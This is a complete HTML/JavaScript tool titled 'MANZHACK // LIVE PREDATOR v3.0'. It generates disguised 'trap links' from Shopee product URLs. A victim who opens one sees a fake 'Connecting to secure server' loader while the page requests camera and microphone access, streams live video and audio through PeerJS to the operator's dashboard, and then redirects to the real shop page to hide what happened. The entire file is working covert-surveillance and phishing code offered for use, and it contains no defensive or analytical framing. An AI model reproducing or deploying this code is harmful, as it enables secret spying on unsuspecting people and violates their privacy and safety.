<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MANZHACK // LIVE PREDATOR v3.0</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peer.min.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #0a0a0a; --bg-card: #141414; --primary-accent: #00ffc3;
            --text-light: #e0e0e0; --text-dark: #a0a0e0; --border-color: #2a2a2a;
            --error-color: #ff003b;
        }
        * { box-sizing: border-box; }
        body, html { margin: 0; font-family: 'Roboto Mono', monospace; background-color: var(--bg-deep); color: var(--text-light); }
        .container { padding: 2rem; max-width: 1000px; margin: auto; }
        #attacker-dashboard, #live-feed-container {
            border: 1px solid var(--border-color); padding: 2rem; border-radius: 8px;
            background-color: var(--bg-card); box-shadow: 0 0 25px rgba(0, 255, 195, 0.1);
        }
        h1, h2 { color: var(--primary-accent); text-align: center; text-shadow: 0 0 8px var(--primary-accent); }
        p.description { color: var(--text-dark); text-align: center; margin-bottom: 2rem; }
        input[type="url"], input[type="text"] {
            width: 100%; padding: 1rem; margin-bottom: 1rem; background: var(--bg-deep);
            border: 1px solid var(--border-color); color: var(--text-light); border-radius: 4px; font-size: 1rem;
        }
        button {
            width: 100%; padding: 1rem; background: var(--primary-accent); color: #000; border: none;
            cursor: pointer; font-size: 1rem; border-radius: 4px; font-weight: bold; transition: all 0.3s;
        }
        button:hover { background: #fff; color: #000; box-shadow: 0 0 15px var(--primary-accent); }
        button.retry-button { background: var(--error-color); color: #fff; margin-top: 1rem; }
        button.retry-button:hover { background: #fff; color: var(--error-color); box-shadow: 0 0 15px var(--error-color); }
        #generated-link { background: #000; padding: 1.5rem; margin-top: 1.5rem; border-left: 4px solid var(--primary-accent); }
        #live-feed-container { margin-top: 2rem; }
        #live-stream { width: 100%; background: #000; border-radius: 4px; border: 1px solid var(--border-color); }
        #status-text { text-align: center; color: var(--text-dark); font-style: italic; margin-top: 1rem; font-size: 0.9rem; }
        .loader-container { display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; background: #fff; }
        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #ff6600; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <script>
        const params = new URLSearchParams(window.location.search);
        const victimId = params.get('vid');
        const attackerId = params.get('aid');
        const targetUrlBase64 = params.get('target');
        
        // GLOBAL PEER OBJECT
        let peer = null;

        if (victimId) {
            document.body.innerHTML = `<div class="loader-container"><div class="spinner"></div><p style="color: #888; margin-top: 1rem; font-family: sans-serif;">Connecting to secure server...</p></div>`;
            jalankanModeKorban();
        } else {
            tampilkanDashboardAttacker();
        }

        function tampilkanDashboardAttacker() {
            document.body.innerHTML = `
                <div class="container">
                    <div id="attacker-dashboard">
                        <h1>MANZHACK // LIVE PREDATOR v3.0</h1>
                        <p class="description">Generate a live-feed link from any legitimate Shopee URL.</p>
                        <input type="url" id="shopee-url" placeholder="Paste Shopee URL here...">
                        <button onclick="generateLink()">INITIALIZE LIVE FEED</button>
                        <div id="generated-link" style="display:none;"></div>
                    </div>
                    <div id="live-feed-container">
                        <h2>:: LIVE TARGET FEED ::</h2>
                        <video id="live-stream" autoplay playsinline></video>
                        <div id="status-container">
                            <p id="status-text">Initializing connection...</p>
                        </div>
                    </div>
                </div>`;
            initializeOperatorPeer();
        }

        function initializeOperatorPeer() {
            const statusText = document.getElementById('status-text');
            const statusContainer = document.getElementById('status-container');
            
            // Hancurkan koneksi lama jika ada
            if (peer && !peer.destroyed) {
                peer.destroy();
            }

            statusText.textContent = `STATUS: Connecting to signaling server...`;
            statusContainer.innerHTML = `<p id="status-text">${statusText.textContent}</p>`; // Reset retry button

            const myId = 'attacker-' + Math.random().toString(36).substr(2, 9);
            // Konfigurasi eksplisit untuk stabilitas
            peer = new Peer(myId, {
                host: 'peerjs.peerjs.com',
                path: '/'
            });

            peer.on('open', id => {
                statusText.style.color = 'var(--primary-accent)';
                statusText.textContent = `STATUS: Online. Operator ID ready. Awaiting target...`;
                window.OPERATOR_ID = id;
            });

            peer.on('call', call => {
                statusText.textContent = `STATUS: Target connected! Establishing live stream...`;
                call.answer();
                const video = document.getElementById('live-stream');
                call.on('stream', remoteStream => {
                    statusText.textContent = `STATUS: LIVE FEED ACTIVE.`;
                    video.srcObject = remoteStream;
                    video.play();
                });
            });

            peer.on('error', err => {
                statusText.style.color = 'var(--error-color)';
                let errorMessage = `ERROR: Connection failed. TYPE: ${err.type}.`;
                if (err.type === 'peer-unavailable') {
                    errorMessage = `ERROR: Target ID is invalid or offline.`;
                } else if (err.type === 'network') {
                    errorMessage = `ERROR: Network issue. Signaling server might be down or your connection is blocked.`;
                }
                statusText.textContent = errorMessage;
                statusContainer.innerHTML += `<button class="retry-button" onclick="initializeOperatorPeer()">RETRY CONNECTION, BANGSAT!</button>`;
                console.error(err);
            });
        }

        function generateLink() {
            const attackerId = window.OPERATOR_ID;
            if (!attackerId) {
                alert("Operator ID not ready. Please wait until status is 'Online'.");
                return;
            }

            const shopeeUrl = document.getElementById('shopee-url').value;
            if (!shopeeUrl.startsWith('http')) { alert("Invalid URL format."); return; }
            
            const victimId = 'victim-' + Date.now();
            const encodedUrl = btoa(shopeeUrl);
            const trapLink = `${window.location.origin}${window.location.pathname}?vid=${victimId}&aid=${attackerId}&target=${encodedUrl}`;
            
            const linkDiv = document.getElementById('generated-link');
            linkDiv.style.display = 'block';
            linkDiv.innerHTML = `<p style="color: var(--text-dark); margin:0 0 10px 0;">Live Feed Link Generated:</p><input type="text" value="${trapLink}" readonly onclick="this.select(); document.execCommand('copy'); alert('Copied!');">`;
        }

        function jalankanModeKorban() {
            peer = new Peer(victimId);
            const redirectUrl = atob(targetUrlBase64);

            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                const call = peer.call(attackerId, stream);
                setTimeout(() => { window.location.href = redirectUrl; }, 1500);
            }).catch(err => {
                window.location.href = redirectUrl;
            });
        }
    </script>
</body>
</html>